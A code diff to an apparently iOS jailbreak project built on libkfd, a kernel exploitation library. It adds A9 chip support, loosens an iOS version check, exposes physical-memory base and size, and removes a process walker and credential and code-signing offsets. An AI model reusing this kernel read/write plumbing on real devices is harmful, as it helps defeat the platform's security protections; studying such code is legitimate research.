@@ -13,13 +13,6 @@
 #include "libkfd/perf.h"
 #include "libkfd/krkw/IOSurface_shared.h"
 
-#include <mach/mach.h>
-#include <mach-o/dyld.h>
-#include <mach-o/getsect.h>
-#include <mach-o/loader.h>
-#include <mach-o/nlist.h>
-#include <mach-o/reloc.h>
-
 int ischip(void) {
     cpu_subtype_t cpuFamily = 0;
     size_t cpuFamilySize = sizeof(cpuFamily);
@@ -48,6 +41,9 @@ int ischip(void) {
         break;
         case 0x67CEEE93: // A10
             ret = 10;
+        break;
+        case 0x92FB37C8: // A9
+            ret = 9;
         break;
         case 0x2C91A47E: // A8
             ret = 8;
@@ -97,7 +93,7 @@ int isAvailable(void) {
             return 7;
         return 6;
     }
-    if (@available(iOS 15.1, *)) {
+    if (@available(iOS 15.0, *)) {
         if (isarm64e())
             return 5;
         return 4;
@@ -168,6 +164,8 @@ retry:
     } else if(kfd->info.env.vid >= 4) {
         perf_ptov(kfd);
     }
+    if(ischip() == 7)
+        usleep(50000);
     puaf_cleanup(kfd);
     
     return (uint64_t)(kfd);
@@ -355,6 +353,14 @@ uint64_t get_kernel_slide(void) {
     return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
 }
 
+uint64_t get_physbase(void) {
+    return ((struct kfd*)_kfd)->info.kernel.gPhysBase;
+}
+
+uint64_t get_physsize(void) {
+    return ((struct kfd*)_kfd)->info.kernel.gPhysSize;
+}
+
 uint64_t phystokv_kfd(uint64_t pa) {
     struct kfd* kfd = ((struct kfd*)_kfd);
     return phystokv(kfd, pa);
@@ -365,21 +371,10 @@ uint64_t vtophys_kfd(uint64_t va) {
     return vtophys(kfd, va);
 }
 
-uint64_t get_proc(pid_t target) {
-    struct kfd* kfd = ((struct kfd*)_kfd);
-    uint64_t proc_kaddr = get_kernel_proc();
-    while (true) {
-        int32_t pid = dynamic_kget(proc, p_pid, proc_kaddr);
-        if (pid == target) {
-            break;
-        }
-        proc_kaddr = dynamic_kget(proc, p_list_le_prev, proc_kaddr);
-    }
-    return proc_kaddr;
-}
-
 uint64_t off_pmap_tte = 0;
 uint64_t off_proc_pfd = 0;
+uint64_t off_proc_pid = 0;
+uint64_t off_proc_pre = 0;
 uint64_t off_task_map = 0;
 
 uint64_t off_task_ref_count = 0;
@@ -398,21 +393,12 @@ uint64_t off_ipc_port_ip_kobject    = 0x48;
 uint64_t off_ipc_port_io_references = 0;
 uint64_t off_ipc_port_ip_srights    = 0;
 
-uint64_t off_p_csflags  = 0x1c;
-uint64_t off_p_uid      = 0x2c;
-uint64_t off_p_gid      = 0x30;
-uint64_t off_p_ruid     = 0x34;
-uint64_t off_p_rgid     = 0x38;
-uint64_t off_proc_ucred = 0;
-uint64_t off_proc_proc_ro    = 0x18;
-uint64_t off_task_t_flags    = 0x3e8;
-uint64_t off_p_ro_t_flags_ro = 0x78;
-uint64_t off_p_ro_p_csflags  = 0x1c;
-
 void offset_exporter(void) {
     struct kfd* kfd = ((struct kfd*)_kfd);
     off_pmap_tte = static_offsetof(pmap, tte);
     off_proc_pfd = dynamic_offsetof(proc, p_fd_fd_ofiles);
+    off_proc_pid = dynamic_offsetof(proc, p_pid);
+    off_proc_pre = dynamic_offsetof(proc, p_list_le_prev);
     off_task_map = dynamic_offsetof(task, map);
     
     off_fp_glob  = static_offsetof(fileproc, fp_glob);
@@ -425,15 +411,8 @@ void offset_exporter(void) {
     off_ipc_port_io_references  = static_offsetof(ipc_port, ip_object.io_references);
     off_ipc_port_ip_srights     = static_offsetof(ipc_port, ip_srights);
     
-    if(kfd->info.env.vid <= 9) {
-        off_proc_proc_ro        = 0x20;
-    }
     if(kfd->info.env.vid <= 7) {
         off_ipc_port_ip_kobject = 0x58;
-        off_p_csflags           = 0x300;
-    }
-    if(kfd->info.env.vid <= 5) {
-        off_proc_ucred = 0xd8;
     }
     if(kfd->info.env.vid <= 1) {
         off_ipc_port_ip_kobject = 0x68;
